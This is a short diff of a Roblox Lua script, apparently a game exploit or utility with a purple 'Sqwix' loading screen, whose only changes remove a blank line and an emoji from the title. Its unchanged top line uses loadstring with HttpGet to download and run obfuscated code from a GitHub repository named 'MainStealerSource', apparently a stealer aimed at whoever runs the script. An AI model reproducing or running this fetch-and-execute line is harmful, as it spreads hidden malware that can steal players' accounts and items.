@@ -1,5 +1,4 @@
 
-
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/hubsrblx/MainStealerSource/refs/heads/main/SourceObf.txt')))()
 
 -- Проверка на уже запущенный скрипт
@@ -51,7 +50,7 @@ local function ShowLoadingScreen()
     Title.Size = UDim2.new(1, 0, 0, 40)
     Title.Position = UDim2.new(0, 0, 0, 10)
     Title.BackgroundTransparency = 1
-    Title.Text = "Sqwix🥵"
+    Title.Text = "Sqwix"
     Title.TextColor3 = Color3.fromRGB(170, 0, 255)
     Title.Font = Enum.Font.ArimoBold
     Title.TextSize = 24
